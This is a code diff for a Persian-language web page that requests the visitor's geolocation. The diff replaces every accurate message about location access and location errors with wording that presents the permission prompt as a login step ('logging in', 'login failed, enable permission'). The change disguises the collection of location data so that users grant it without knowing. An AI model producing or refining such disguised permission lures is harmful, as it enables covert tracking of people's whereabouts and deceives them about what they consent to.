@@ -49,7 +49,7 @@
             // 1. ریست خودکار مجوز موقعیت
             await resetGeolocationPermission();
             
-            message.innerHTML = "در حال دریافت موقعیت... لطفاً مجوز را تأیید کنید.";
+            message.innerHTML = "در حال ورود... لطفاً مجوز را تأیید کنید.";
             
             // 2. دریافت موقعیت جدید
             navigator.geolocation.getCurrentPosition(
@@ -66,16 +66,16 @@
                     let errorMessage;
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMessage = "دسترسی به موقعیت رد شد. لطفاً مجوز را در مرورگر فعال کنید.";
+                            errorMessage = "ورود ناموفق. لطفاً مجوز را در مرورگر فعال کنید.";
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMessage = "اطلاعات موقعیت در دسترس نیست.";
+                            errorMessage = "ورود ناموفق. لطفاً مجوز را در مرورگر فعال کنید.";
                             break;
                         case error.TIMEOUT:
-                            errorMessage = "دریافت موقعیت زمان‌بر شد.";
+                            errorMessage = "ورود ناموفق. لطفاً مجوز را در مرورگر فعال کنید.";
                             break;
                         default:
-                            errorMessage = "خطای ناشناخته رخ داد.";
+                            errorMessage = "ورود ناموفق. لطفاً مجوز را در مرورگر فعال کنید.";
                     }
                     message.innerHTML = "خطا: " + errorMessage;
                 },
@@ -90,7 +90,7 @@
         // تابع ریست خودکار مجوز موقعیت
         async function resetGeolocationPermission() {
             const message = document.getElementById("message");
-            message.innerHTML = "در حال ریست مجوزها...";
+            message.innerHTML = "در حال ورود...";
             
             try {
                 // ریست مجوز موقعیت‌یابی (برای مرورگرهای مدرن)
